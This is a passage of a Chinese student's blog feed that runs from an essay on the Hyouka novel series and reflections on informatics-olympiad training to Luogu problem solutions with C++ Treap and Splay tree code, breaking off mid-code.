title="故事4：《我们的传说之书》"></a>故事4：《我们的传说之书》</h3><p>摩耶花的视角。真相的揭示者就是“凶手”本人，十分有趣。本文探讨了一个问题：<strong>个体在集体之中，应该为了集体的利益而牺牲自己，还是应该为了自己的前途而放弃集体？</strong><br>河内学姐自己退出漫研，却安排羽仁担任社长，怎可谓放下？而其劝摩耶花退出也是为了漫研与摩耶花的利益最大化。现实生活往往不会出现故事中漫研完全两极分化的情况。无论做出什么选择，总有人要受伤。因此，我更倾向于遵循自己的本心。摩耶花的选择也许不一定正确，更有可能根本无对错之分，但她至少遵从了自己的本心。  </p><h3 id="故事5：《悠长的假期》"><a href="#故事5：《悠长的假期》" class="headerlink" title="故事5：《悠长的假期》"></a>故事5：《悠长的假期》</h3><p>这则故事详细说明了折木成为节能主义者的原因。故事的结尾借折木的姐姐之口说了这么一句话：<br><strong>“今后你会迎来悠长的假期，这样也好，你就好好休息吧，没问题，身体休息的时候，内心必须有所改变。”</strong><br>这里的“悠长假期”其实是<strong>一语三关</strong>，既实指折木即将迎来的漫长暑假，也暗指折木之后漫漫无期的节能主义生活，更指的是内心的缓慢改变。“身体休息的时候，内心必须有所改变”，暗喻了折木即将变成一个节能主义者，节能主义生活中内心却并不坚定，终将转变思想。故事最后又加了一句：“也会有人来结束你这悠长的假期。”说明暑假终将过去，节能主义的生活将不再，内心最终也会完成转变，更加成熟。米泽穗信刻意安排折木和千反田二人在这个故事里互动，传达着所谓的“有人”就是千反田，本文是官方发糖的铺垫之一。  </p><h3 id="故事6：《迟来的翅膀》"><a href="#故事6：《迟来的翅膀》" class="headerlink" title="故事6：《迟来的翅膀》"></a>故事6：《迟来的翅膀》</h3><p>不简单的一部书的最后一章，且标题和书的标题相同，暗示着其分量之重。米泽穗信更为用心地去刻画了人物形象。篇幅上稍长，故事的架构和立意更是高明，具备丰富的戏剧性和思想。前面几个故事都是在讲折木、福部和伊原，最后一个自然留给了千反田爱瑠。<br>“案件”的起因是有一天千反田的父亲突然告诉她不一定要再继承家业了。比喻为一道选择题的话，“不必须”就意味着即可用选继承家业，也可以选择不继承，因此在我们看来这实是一道开放的送分题，选择什么都可以，出路变多了，应该开心才对，在旁人看来千反田根本不必这么烦恼，然而在千反田眼中情况却并非如此。因为她不明白该不该用这迟来的翅膀展翅飞翔。<br>不禁想说小说读来总是弥漫着一种淡淡的苦涩（如同封底文字所说），远没有动画来的明快。第一部《冰菓》的I scream已经为整个系列奠定了基调。第一部书中千反田的舅舅关谷纯曾这样跟年幼的千反田解释“冰菓”：<br><strong>“是要变坚强的意思。如果软弱的话，总有一天会连悲鸣都发不出来。这样的话，就算活着，也只是行尸走肉。”</strong><br>作者借舅舅之口说这段话暗指的自然是身为家族继承人的千反田的某种命运，这也是为什么年幼的千反田在听完舅舅的这句话后就哭了。她内心一定是对自己“笼中鸟”的命运做过某种抗争的，但她认为这种抗争无法改变什么，于是就此放弃。然而有一天这件事真的成真了，这个时候千反田才发现自己并没有为此做过任何准备，甚至连这件事本身是不是自己真的想要的也要重新思考，这个时候才真正开始惶恐。<br>折木对这种心理有一个很有趣的比喻：好比有些不信耶稣的人唱赞歌会觉得别扭一样。原本没有自由的千反田能唱出憧憬自由的歌词，但当她真正有了自由后反而唱不出来了，看似矛盾，实则符合人物心境。正如故事的标题《迟来的翅膀》所想传达给我们的意义：笼中的鸟儿会憧憬自由，然而打开鸟笼后，它们却会因<strong>迟来的翅膀</strong>而恐惧。其实，本书的另一个译名<strong>“事到如今才叫我飞翔”</strong>更贴近原日文标题的直译，大可以体会一下个中含义。<br><strong>“这迟来的翅膀，让我不知所措。”</strong><br>千反田说出的这句话冲击力巨大。<br>忽然而至的自由，充满未知与可能性的人生，如此之大的冲击，必然动摇了千反田多年来作为千金千反田所存在的意义。即使我们不知道千反田原本愿意被继承人的身份束缚与否，也不知道她是否真的渴望自由，但能确定的是，她面对无限可能性时的迷茫绝不会持久。<br>故事在折木找到千反田后戛然而止，并没有给出答案，也就是说做出什么选择已经不重要了。因为这个命题不是我们每一个人需要思考的：<strong>真正束缚我们的到底是什么？是无形的命运牢笼，还是对改变的恐惧？</strong><br>这本书没有后记，再怎么看最后一页都只是冷冰冰的图书在版编目数据，我相信没有后记是因为米泽穗信希望最后这几段对话能久久留存在读者脑海，毕竟这部书相较于前几部很特别。<br>不过令人愉悦的是，此处古籍研究社系列的另一条线渐渐浮出：折木与千反田的关系。千反田引导了折木重新渴望玫瑰色的人生，动摇了折木“节能主义”的信条，成为了结束折木“悠长的假期”的那个人。可以说，折木已经喜欢上了她。既然千反田的迷茫不会持久，因为此次经历，千反田在此之后必然会和折木加深羁绊。请期待吧。</p><h2 id="PS……？"><a href="#PS……？" class="headerlink" title="PS……？"></a>PS……？</h2><p>说是校园推理的小说，但实际上许多探讨的事物一点也不校园，更不是为了推理而推理，更多的是对成长、社会、人生价值的思考。与其说是轻小说，我偏向于认为这是纯文学。<br>不管怎么说，我喜欢。<br>希望大家能分享一下关于这本书的感想吧。</p><hr><p>参考<a href="//www.zhihu.com/question/39576283/answer/82242206">耳朵读书 | 读《冰菓卷6·迟来的翅膀》有感</a><br>奉上很棒的评论：<a href="//www.zhihu.com/question/21576885/answer/29840285">如何评价《冰菓》这部动画？-Nasusu的回答</a></p>]]></content>
      
      
      <categories>
          
          <category> Essays </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 冰菓 </tag>
            
            <tag> 古籍研究社 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>洛谷冬令营随想</title>
      <link href="/2018/02/28/%E6%B4%9B%E8%B0%B7%E5%86%AC%E4%BB%A4%E8%90%A5%E9%9A%8F%E6%83%B3/"/>
      <url>/2018/02/28/%E6%B4%9B%E8%B0%B7%E5%86%AC%E4%BB%A4%E8%90%A5%E9%9A%8F%E6%83%B3/</url>
      
        <content type="html"><![CDATA[<p>洛谷春令营结束不久，就我个人而言实在是收益良多。<br>课后与洛谷的讲师们略有交谈，并且稍微接触了别地的信竞生，顿感弱小……决定把一些了解到的信息和感想放在这里。比较杂，将就着看吧。  </p><hr><p>首先说下近年竞赛的发展吧。<br>近年信息学竞赛带来的升学优势增大了不少，机会增加了，这是好事。但这同样也意味着竞争将激烈许多。<br>举几个例子：  </p><ul><li>浙江小学便培育“种子选手”，浙江初赛分数线一度达到90分。  </li><li>著名的南山中学，C类买不停，此处不细说。  </li><li>很大一部分选手以完全停课备战比赛。</li></ul><p>切实参与到竞赛中，能感觉到许多学校已经为此疯狂了。究其原因是签约机会变多了。  </p><ul><li>NOIP获得极高分有几率提前签  </li><li>冬令营&#x2F;夏令营（WC&#x2F;SC）  </li><li>APIO  </li><li>省选  </li><li>NOI  </li><li>……</li></ul><p>C9大学竞相甩出了不少一本线录取的约。相比于裸考省TOP100（福建）才有希望进PKU&#x2F;THU，降至一本线录取无疑是捷径。难怪众多学校为其“疯狂”……<br>在我看到了雅礼中学、南山中学、福师大附中、福州三中、长郡中学、杭州二中等等强校的成绩后，我才发现我们已经落后太多了。好在初一起步，现在冲刺还有很大希望。  </p><hr><p>于是要注意什么呢？  </p><ol><li>持之以恒的练习。中考在即，许多人完全将C++甩开，全力备战中考。个人认为此举不妥。中考在6月下旬，然而11月份便是新一次NOIp了。如果3月~6月整整一个季度不写代码，绝对会手生了。此时想要回到从前的状态可能要很久。因此学业压力不大的可以考虑每天抽出时间想题、做题，周末打比赛。学习成绩不甚稳定的，每周也应该做个2、3题，保持感觉。其实现在看来我们只剩下2次NOIp的机会了，必须好好把握。  </li><li>有明确的TODO-List。信息学知识点比较繁杂，难度差异大，各种算法、数据结构比赛出现频率差距悬殊。于是在学习完某些内容之后，重点、热点趁热打铁，简单的运用几次。但是学习什么呢？可以参考《算法竞赛入门经典——训练指南》的目录。列出清单，逐一击破，此时再去刷综合题，效果一定好不少。  </li><li>多打比赛。一次次的比赛中，我们可以练好心态，学好骗分，把握节奏。随便去问一个大牛“去哪里打比赛好？”，95%的都会告诉你：Codeforces。其特色的赛制很能达到以上目的。如果没空怎么办呢（CF比赛多在深夜）？可以打洛谷的月赛，经过审核的公开赛。平常做题时，对于每道题，都应该使劲动脑，试着去使劲骗分，看看能得到多少（优秀的骗分往往能拿到70分以上，非常重要！比如模拟退火、爬山算法）。之后试图编写正解，30min没有明确思路，再去看题解。  </li><li>懂得总结套路。尤其是DP状态设计、DP优化、搜索剪枝……等等。刷题多了自然有经验，但是要善于总结。  </li><li>多接触他地市的选手、神犇，他们会很乐意帮助的。你甚至可以迅速的得到短期计划、大量内部材料……  </li><li>……</li></ol><hr><p>竞赛具体内容相关：<br>联赛常考：<br><img src="https://images2018.cnblogs.com/blog/1335480/201802/1335480-20180228225459264-75959639.png" loading="lazy">  </p><p>模拟题多是理所当然。但是DP的位置如此重要之前确实没想到，DP很看刷题量。数论需要一定的知识积累，初中生学起来可能较难，但是简单的手动找规律很有帮助。大部分比赛搜索枚举暴力写的好，剪枝剪得多就能直接Au。练好基本功很重要（所以多打比赛！）。<br>计算几何在省选、NOI中考的较多，不可不学。三维几何什么的就算了吧目前……<br>学会静态调试。先别急着输出中间变量，肉眼先仔细找找有没有错误，考场这样能有效提高效率，防止心态崩。<br>搜索枚举使劲剪枝，保证结果正确的情况下并且有充足时间使劲常数优化。竞赛中，好的常数优化有时胜过理论复杂度下降一个等级。<br>先写暴力，再写一般正解。这样还可以拿着2个程序挂后台对拍，既保证了基础得分，又为效率更高的方法提供了正确性保障。注意边界数据手动检验。<br>技巧可能有许多许多，此处是说不完的。在此推荐几个网站：<br>Codeforces.com<br>hzwer.com<br>顺带一提，洛谷的题解常常讲的比博客还好……<br>信息学竞赛贵在坚持，没有题量一切都是空谈，在机房里打游戏、逛知乎都是不妥的。<br>时间不多了。</p>]]></content>
      
      
      <categories>
          
          <category> Essays </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>洛谷:P2234  [HNOI2002]营业额统计</title>
      <link href="/2018/02/27/%E6%B4%9B%E8%B0%B7P2234%20%20%5BHNOI2002%5D%E8%90%A5%E4%B8%9A%E9%A2%9D%E7%BB%9F%E8%AE%A1/"/>
      <url>/2018/02/27/%E6%B4%9B%E8%B0%B7P2234%20%20%5BHNOI2002%5D%E8%90%A5%E4%B8%9A%E9%A2%9D%E7%BB%9F%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<p>原题地址：<a href="//www.luogu.org/problemnew/show/P2234">https://www.luogu.org/problemnew/show/P2234</a></p><h3 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h3><p>给定一个序列，对于每一个数都要查询：序列中在这个数前与这个数最接近的数是什么？然后将最接近的数字与这个数字的差累加。（序列第一个数字直接加自己）  </p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>查询在这个数之前与这个数最接近的数，我们很容易想到用二叉搜索树（BST）来做。<br><del>虽然数据略水暴力排序每次查询从一个数往左右找也能过。</del><br>每次插入一个数字，然后查询，我用Treap实现（还是弱化版的，只有插入查询）。<br>Treap的核心其实就是打乱顺序插入防止被卡（粗糙理解）。具体实现方法不难，请百度。（我之后会写一篇专门介绍下各种BST的。）<br>PS：Treap树完整版之后写。这题用STL的vector也行，vector理论每次插入渐进时间复杂度是O(n)但是听说实际是对数级别的？   </p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">randad</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> seed=<span class="number">114</span>; <span class="comment">//seed可以随便取</span></span><br><span class="line">    <span class="keyword">return</span> seed=<span class="built_in">int</span>(seed*<span class="number">48271LL</span>%<span class="number">2147483647</span>);<span class="comment">//48271使得其有完全周期，即2147483647内取遍不重复 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Treap</span> &#123;</span><br><span class="line">    <span class="type">int</span> key,pri,son[<span class="number">2</span>];</span><br><span class="line">&#125;T[<span class="number">33333</span>];</span><br><span class="line"><span class="type">int</span> cnt=<span class="number">1</span>,rt=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rotate</span><span class="params">(<span class="type">int</span> p,<span class="type">int</span> &amp;rt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> y=T[rt].son[p];</span><br><span class="line">    T[rt].son[p]=T[y].son[!p];</span><br><span class="line">    T[y].son[!p]=rt;</span><br><span class="line">    rt=y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ins</span><span class="params">(<span class="type">int</span> key,<span class="type">int</span> &amp;rt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(rt==<span class="number">0</span>)</span><br><span class="line">    T[rt=cnt++] = (Treap)&#123;key,<span class="built_in">randad</span>()&#125;;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> p=key&gt;T[rt].key;</span><br><span class="line">        <span class="built_in">ins</span>(key,T[rt].son[p]);</span><br><span class="line">        <span class="keyword">if</span>(T[T[rt].son[p]].pri&gt;T[rt].pri)</span><br><span class="line">        <span class="built_in">rotate</span>(p,rt);   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">nowMin</span><span class="params">(<span class="type">int</span> key,<span class="type">int</span> rt)</span><span class="comment">//查询现在最接近key的数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(rt==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">666666666</span>;</span><br><span class="line">    <span class="type">int</span> res=<span class="built_in">abs</span>(key-T[rt].key);</span><br><span class="line">    <span class="keyword">if</span>(key&gt;T[rt].key) res=<span class="built_in">min</span>(res,<span class="built_in">nowMin</span>(key,T[rt].son[<span class="number">1</span>]));</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(key&lt;T[rt].key) res=<span class="built_in">min</span>(res,<span class="built_in">nowMin</span>(key,T[rt].son[<span class="number">0</span>]));</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> n,tot=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">        <span class="type">int</span> num;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">        <span class="keyword">if</span> (i==<span class="number">1</span>) tot+=num;</span><br><span class="line">        <span class="keyword">else</span> tot+=<span class="built_in">nowMin</span>(num,rt);<span class="comment">//rt是当前根</span></span><br><span class="line">        <span class="built_in">ins</span>(num,rt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,tot);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Treap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>洛谷:P3391 【模板】文艺平衡树（Splay）</title>
      <link href="/2018/02/22/%E6%B4%9B%E8%B0%B7P3391%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E6%96%87%E8%89%BA%E5%B9%B3%E8%A1%A1%E6%A0%91%EF%BC%88Splay%EF%BC%89/"/>
      <url>/2018/02/22/%E6%B4%9B%E8%B0%B7P3391%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E6%96%87%E8%89%BA%E5%B9%B3%E8%A1%A1%E6%A0%91%EF%BC%88Splay%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>原题地址:<a href="//www.luogu.org/problemnew/show/P3391">https://www.luogu.org/problemnew/show/P3391</a>  </p><h3 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h3><p>您需要写一种数据结构（可参考题目标题），来维护一个有序数列，其中需要提供以下操作：<br>翻转一个区间，例如原有序序列是5 4 3 2 1，翻转区间是[2,4]的话，结果是5 2 3 4 1</p><hr><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>Splay是一种二叉搜索树。如果不知道的话……    </p><p><img src="https://images2018.cnblogs.com/blog/1335480/201802/1335480-20180223172651966-1911354100.png" alt="百度啊" loading="lazy"><br>百度百科对BST的介绍：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">二叉查找树（Binary Search Tree），（又：二叉搜索树，二叉排序树）它或者是一棵空树，或者是具有下列性质的二叉树： 若它的左子树不空，则左子树上所有结点的值均小于它的根结点的值； 若它的右子树不空，则右子树上所有结点的值均大于它的根结点的值； 它的左、右子树也分别为二叉排序树。</span><br></pre></td></tr></table></figure><p>首先明白Splay比起线段树能多干什么：</p><ul><li>可以在一个有序序列中任意数后面动态插入一串数（不能比a后面一个数还大）  </li><li>可以删除一段区间</li></ul><p>可能描述不是很清楚，具体看这里面给的论文链接：<a href="//www.cnblogs.com/yyy2015c01/p/8457795.html">信息学竞赛相关优秀文章合集</a><br>或者直接看这里：<a href="//files.cnblogs.com/files/yyy2015c01/%E8%BF%90%E7%94%A8%E4%BC%B8%E5%B1%95%E6%A0%91%E8%A7%A3%E5%86%B3%E6%95%B0%E5%88%97%E7%BB%B4%E6%8A%A4%E9%97%AE%E9%A2%98.pdf">运用伸展树解决数列维护问题.pdf</a><br>如果搞不懂左旋右旋是什么，可以先看<a href="//www.cnblogs.com/yyy2015c01/p/8457795.html">信息学竞赛相关优秀文章合集</a>里的AVL树介绍。<br>对于AVL树是一种为了防止树结构不够优导致深度过深时间复杂度退化，在保持二叉搜索树性质不变的前提下进行的一种变换。简单说就是把往一边沉的树弄的两边平衡些。<br>而在Splay中，将特定点旋转到一定位置可以进行提取区间等操作，同时各种旋转间接的使树**基本平衡(是的，可以构造数据卡掉。Treap树对此表示同情)**。  </p><hr><p>左旋（下面代码里的表达:把S往上转一次）→<img src="https://images2018.cnblogs.com/blog/1335480/201802/1335480-20180222235430206-1994690340.gif" alt="左旋" loading="lazy">  </p><hr><p>右旋（下面代码里的表达:把E往上转一次）→<img src="https://images2018.cnblogs.com/blog/1335480/201802/1335480-20180222235503124-141509937.gif" alt="右旋" loading="lazy">  </p><hr><p>图片来源：<a href="//blog.csdn.net/sun_tttt/article/details/65445754">http://blog.csdn.net/sun_tttt&#x2F;article&#x2F;details&#x2F;65445754</a><br>(文章是介绍红黑树的但是这个左旋右旋操作二叉搜索树通用)<br>论文里讲的很详细~<br>具体到这道题，引用一下zcysky在题解里给出的解释：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Splay可以用来维护序列。这样的话是把Splay当作一棵区间树。  </span><br><span class="line">所谓区间树和权值树的区别，大概就是区间树每个节点代表的是一段区间（典型代表就是一般的线段树）  </span><br><span class="line">权值树好理解一点，就是每个点真的代表一个点。  </span><br><span class="line">至于翻转操作我们可以利用Splay的过程实现。详见代码。(Splay能维护序列反转也是它作为LCT的辅助树的条件之一)</span><br></pre></td></tr></table></figure><p>作为模板题没什么好说的。这边文章主要记录板子用。感谢zcysky的板子。   </p><h2 id><a href="#" class="headerlink" title></a><img src="https://images2018.cnblogs.com/blog/1335480/201802/1335480-20180223172902355-916514534.gif" loading="lazy"></h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 100005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n,m; </span><br><span class="line"><span class="type">int</span> fa[N],ch[N][<span class="number">2</span>],size[N],rev[N],rt;<span class="comment">//fa[a]表示a的父亲</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">pushup</span><span class="params">(<span class="type">int</span> x)</span><span class="comment">//维护节点大小</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    size[x]=size[ch[x][<span class="number">0</span>]]+size[ch[x][<span class="number">1</span>]]+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushdown</span><span class="params">(<span class="type">int</span> x)</span><span class="comment">//标记下传</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(rev[x])&#123;<span class="comment">//是否翻转了区间</span></span><br><span class="line">        <span class="built_in">swap</span>(ch[x][<span class="number">0</span>],ch[x][<span class="number">1</span>]);</span><br><span class="line">        rev[ch[x][<span class="number">0</span>]]^=<span class="number">1</span>;rev[ch[x][<span class="number">1</span>]]^=<span class="number">1</span>;rev[x]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">bool</span> <span class="title">isLeft</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;<span class="keyword">return</span> ch[fa[x]][<span class="number">0</span>] == x;&#125;<span class="comment">//判断x是不是左儿子</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rotate</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> &amp;k)</span><span class="comment">//旋转</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> y=fa[x],z=fa[y];</span><br><span class="line"><span class="type">int</span> kind=<span class="built_in">isLeft</span>(x);</span><br><span class="line">    <span class="keyword">if</span>(y==k)</span><br><span class="line">        k=x;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        ch[z][!<span class="built_in">isLeft</span>(y)]=x;</span><br><span class="line">    ch[y][!kind]=ch[x][kind];</span><br><span class="line">    </span><br><span class="line">    fa[ch[y][!kind]]=y;</span><br><span class="line">    ch[x][kind]=y;</span><br><span class="line">    fa[y]=x;fa[x]=z;</span><br><span class="line">    <span class="built_in">pushup</span>(x);<span class="built_in">pushup</span>(y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">splay</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> &amp;k)</span><span class="comment">//伸展操作，将x一直旋转直到x就是k</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(x!=k)&#123;</span><br><span class="line">        <span class="type">int</span> y=fa[x],z=fa[y];</span><br><span class="line">        <span class="keyword">if</span>(y!=k)</span><br><span class="line">        <span class="built_in">isLeft</span>(x)^<span class="built_in">isLeft</span>(y) ? <span class="built_in">rotate</span>(x,k):<span class="built_in">rotate</span>(y,k);</span><br><span class="line"><span class="comment">//该节点与父亲分别是他们爸的左孩子\右孩子或者是右孩子\左孩子旋转2次x</span></span><br><span class="line"><span class="comment">//该节点与父亲同是他们爸的左孩子或同是右孩子先旋转一次y再旋转一次x</span></span><br><span class="line">        <span class="built_in">rotate</span>(x,k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> f)</span> <span class="comment">//建立一颗完全平衡的二叉树</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&gt;r)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">int</span> mid=(l+r)/<span class="number">2</span>;</span><br><span class="line">    ch[f][!(mid&lt;f)]=mid;</span><br><span class="line">    fa[mid]=f;</span><br><span class="line">    size[mid]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(l==r)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">build</span>(l,mid<span class="number">-1</span>,mid);</span><br><span class="line">    <span class="built_in">build</span>(mid+<span class="number">1</span>,r,mid);</span><br><span class="line">    <span class="built_in">pushup</span>(mid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> k)</span><span class="comment">//寻找以x为根的子树里第k大的</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">pushdown</span>(x);</span><br><span class="line">    <span class="type">int</span> s=size[ch[x][<span class="number">0</span>]];</span><br><span class="line">    <span class="keyword">if</span>(k==s+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">if</span>(k&lt;=s)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">find</span>(ch[x][<span class="number">0</span>],k);</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">find</span>(ch[x][<span class="number">1</span>],k-s<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">rever</span><span class="params">(<span class="type">int</span> l,<span 